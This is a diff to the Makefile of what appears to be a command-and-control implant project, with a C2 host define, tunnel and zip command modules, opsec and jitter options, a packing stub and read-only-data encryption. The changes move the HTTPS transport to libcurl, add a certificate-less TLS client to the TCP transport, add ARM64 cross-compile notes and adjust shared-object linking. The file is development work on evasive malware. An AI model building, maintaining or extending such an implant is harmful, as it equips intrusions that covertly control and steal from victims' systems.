@@ -34,6 +34,7 @@ NAX_JITTER_PCT  ?= 0
 NAX_STUB        ?= 1
 
 RODATA_CRYPT    := src/stub/rodata_crypt.py
+comma           := ,
 STUB_DIR        := src/stub
 STUB_SRC        := $(STUB_DIR)/stub.c
 STUB_PAYLOAD    := $(STUB_DIR)/stub_payload.h
@@ -89,21 +90,21 @@ else ifeq ($(NAX_TCP_MODE),https)
              src/Commands/zip.c \
              src/Transport/https.c \
              src/Transport/https_profile.c
-  ifneq ($(OPENSSL_INC),)
-    CFLAGS += -I$(OPENSSL_INC)
+  # libcurl (replaces hand-rolled OpenSSL TLS/HTTP).
+  # Uses pkg-config when available; falls back to -lcurl.
+  # For cross-compile set CURL_CFLAGS / CURL_LIBS manually, e.g.:
+  #   make NAX_TCP_MODE=https CC=aarch64-linux-gnu-gcc \
+  #        CURL_CFLAGS="-I/usr/include/aarch64-linux-gnu" \
+  #        CURL_LIBS="-L/usr/lib/aarch64-linux-gnu -lcurl"
+  ifeq ($(CURL_LIBS),)
+    CURL_LIBS  := $(shell pkg-config --libs   libcurl 2>/dev/null || echo -lcurl)
   endif
-  ifeq ($(CC),aarch64-linux-gnu-gcc)
-    OPENSSL_TRIPLET := aarch64-linux-gnu
-  else
-    OPENSSL_TRIPLET :=
+  ifeq ($(CURL_CFLAGS),)
+    CURL_CFLAGS := $(shell pkg-config --cflags libcurl 2>/dev/null)
   endif
-  ifneq ($(OPENSSL_TRIPLET),)
-    CFLAGS       += -I/usr/include/$(OPENSSL_TRIPLET)
-    LDFLAGS       = -pie -Wl,-Bstatic -lpthread -lz -Wl,-Bdynamic \
-                    -L/usr/lib/$(OPENSSL_TRIPLET) -lssl -lcrypto -Wl,-z,relro,-z,now -Wl,-z,noexecstack
-  else
-    LDFLAGS       = -pie -Wl,-Bstatic -lpthread -lz -Wl,-Bdynamic -lssl -lcrypto -Wl,-z,relro,-z,now -Wl,-z,noexecstack
-  endif
+  CFLAGS  += $(CURL_CFLAGS)
+  LDFLAGS  = -pie -Wl,-Bstatic -lpthread -lz -Wl,-Bdynamic \
+             $(CURL_LIBS) -Wl,-z,relro,-z,now -Wl,-z,noexecstack
   LDFLAGS_EXTRA :=
 else
   CFLAGS  += -DNAX_C2_HOST=\"$(NAX_C2_HOST)\" \
@@ -114,7 +115,19 @@ else
              src/Commands/tunnel.c \
              src/Commands/zip.c \
              src/Transport/tcp.c
-  LDFLAGS_EXTRA :=
+  # TLS via OpenSSL — same cert-less client pattern as HTTPS transport.
+  # For cross-compile ARM64:
+  #   make NAX_TCP_MODE=tcp CC=aarch64-linux-gnu-gcc \
+  #        SSL_CFLAGS="-I/usr/include/aarch64-linux-gnu" \
+  #        SSL_LIBS="-L/usr/lib/aarch64-linux-gnu -lssl -lcrypto"
+  ifeq ($(SSL_LIBS),)
+    SSL_LIBS  := $(shell pkg-config --libs   openssl 2>/dev/null || echo -lssl -lcrypto)
+  endif
+  ifeq ($(SSL_CFLAGS),)
+    SSL_CFLAGS := $(shell pkg-config --cflags openssl 2>/dev/null)
+  endif
+  CFLAGS      += $(SSL_CFLAGS)
+  LDFLAGS_EXTRA := $(SSL_LIBS)
 endif
 
 # ===== opsec =====
@@ -132,6 +145,7 @@ endif
 ifeq ($(NAX_DEBUG),1)
   CFLAGS  += -DNAX_DEBUG -g -O0
   SUFFIX  := $(SUFFIX)_debug
+  NAX_STUB := 0
 endif
 
 # ===== format =====
@@ -139,6 +153,7 @@ ifeq ($(NAX_FORMAT),so)
   SRCS   += src/shared.c
   CFLAGS := $(subst -fPIE,-fPIC,$(CFLAGS))
   LDFLAGS := $(subst -pie,-shared,$(LDFLAGS))
+  LDFLAGS := $(subst -Wl$(comma)-Bstatic -lpthread -lz -Wl$(comma)-Bdynamic,-lpthread -lz,$(LDFLAGS))
   SUFFIX := $(SUFFIX).so
   RODATA_ENCRYPT := 1
 else
